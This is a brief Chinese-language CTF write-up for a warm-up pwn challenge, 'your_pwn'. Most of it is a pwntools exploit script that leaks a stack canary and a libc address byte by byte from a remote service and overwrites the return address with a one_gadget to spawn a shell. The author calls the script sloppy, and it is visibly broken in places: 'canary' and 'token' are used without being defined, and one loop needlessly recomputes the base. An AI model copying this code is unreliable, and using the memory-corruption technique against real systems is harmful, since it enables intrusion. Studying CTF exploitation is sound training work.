# your_pwn
热身签到题,随便看,随便改.
无奈我太慌张了脑子一热居然上手就泄露canary...
泄漏完了就在想我是谁我在干什么..
正确的做法是泄露libc 将返回地址改成one就可以了...
不想改exp直接放我那个傻逼exp把..
```python
from pwn import *
#p=process('./pwn')
p=remote("39.106.224.151",57856)
name="n132"
p.sendlineafter("name:",name)
for x in range(7):
	p.sendlineafter("index\n",str(0x149+6-x))
	p.readuntil("(hex) ")
	re=int("0x"+p.readline()[:-1],16)
	re=re&0xff
	canary=re+canary*0x100
	
	p.sendlineafter("value\n",str(re))

base=0

for x in range(6):
	p.sendlineafter("index\n",str(0x278+5-x))
	p.readuntil("(hex) ")
	re=int("0x"+p.readline()[:-1],16)
	re=re&0xff
	base=re+base*0x100
	p.sendlineafter("value\n",str(re))
base=base-(0x7ffff7a2d830-0x00007ffff7a0d000)
log.info(hex(base))
tmp=0
one=0x45216+base
log.info(hex(one))
l=[0xff0000000000,0xff00000000,0xff000000,0xff0000,0xff00,0xff]
for x in range(6):
	p.sendlineafter("index\n",str(0x278+5-x))
	p.readuntil("(hex) ")
	re=int("0x"+p.readline()[:-1],16)
	re=re&0xff
	base=re+base*0x100
	p.sendlineafter("value\n",str((one&l[x])>>(8*(5-x))))
context.log_level='debug'
for x in range(22):
	p.sendlineafter("index\n",str(0))
	p.sendlineafter("value\n",str(0))
p.sendlineafter("es/no)? ","no")
p.sendline(token)
p.interactive()
```